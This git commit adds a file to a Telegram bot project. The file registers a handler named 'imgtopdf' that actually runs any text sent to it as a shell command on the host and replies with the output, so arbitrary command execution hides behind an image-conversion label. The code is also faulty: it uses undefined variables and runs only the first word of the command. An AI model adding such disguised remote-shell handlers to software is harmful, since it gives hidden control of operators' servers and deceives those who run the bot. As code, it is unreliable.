f5f97359d5e51f09b0afae78b0827bc6a3d6ac4f
Anshu <81678105+ItzKakarotto@users.noreply.github.com>
2022-11-09 20:11:55 +0530

    Create shell.py

---
+++ bot/bypasser/shell.py
@@ -0,0 +1,24 @@
+import subprocess
+from bot import app, DEV_USERS
+from pyrogram import filters
+
+@app.on_message(filters.user(DEV_USERS) & filters.command('imgtopdf'))
+async def shell(_, message):
+    cmd = message.text.split()[1]
+    process = subprocess.Popen(
+        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True,
+    )
+    stdout, stderr = process.communicate()
+    stderr = stderr.decode()
+    stdout = stdout.decode()
+    Kek = ""
+    if stdout:
+        Kek += f"*Stdout*\n`{stdout}`\n"
+    if stderr:
+        Kek += f"*Stderr*\n`{stderr}`\n"
+    if len(reply) > 3000:
+        with open("kek.txt", "w") as file:
+            file.write(Kek)
+        return messages.reply_document("kek.txt")
+    else:
+        message.reply_text(reply)
